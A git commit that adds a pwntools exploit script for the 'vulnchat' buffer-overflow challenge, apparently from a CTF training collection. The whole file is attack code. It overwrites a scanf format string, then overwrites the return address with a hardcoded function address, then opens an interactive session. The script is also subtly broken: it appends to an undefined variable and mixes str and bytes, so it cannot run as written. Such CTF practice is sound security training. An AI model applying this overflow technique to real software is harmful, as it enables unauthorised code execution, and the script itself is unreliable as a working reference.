1b210223ade54b2432f2e15ecc89acce21b14831
lona9a <adrianbeckdev@gmail.com>
2021-07-28 20:06:36 +0200

    Solved vulnchat

---
+++ nightmare-challenges/BOF/callfunction/vulnchat/sploit.py
@@ -0,0 +1,26 @@
+from pwn import *
+
+# Establish the target process
+target = process('./vuln-chat')
+
+# Print the initial text
+print(target.recvuntil("username: "))
+
+# Form the first payload to overwrite the scanf format string
+payload0 += b'\x00'*0x14 + '%99s' # Fill up space to format string
+
+# Send the payload with a newline character
+target.sendline(payload0)
+
+# Print the text up to the second scanf call
+print(target.recvuntil("I know I can trust you?"))
+
+# From the second payload to overwrite the return address
+payload1 = ""
+payload1 += b'\x01'*0x31 + p32(0x804856b)# Filler space to return address
+
+# Send the second payload with a newline character
+target.sendline(payload1)
+
+# Drop to an interactive shell to view the rest of the input
+target.interactive()
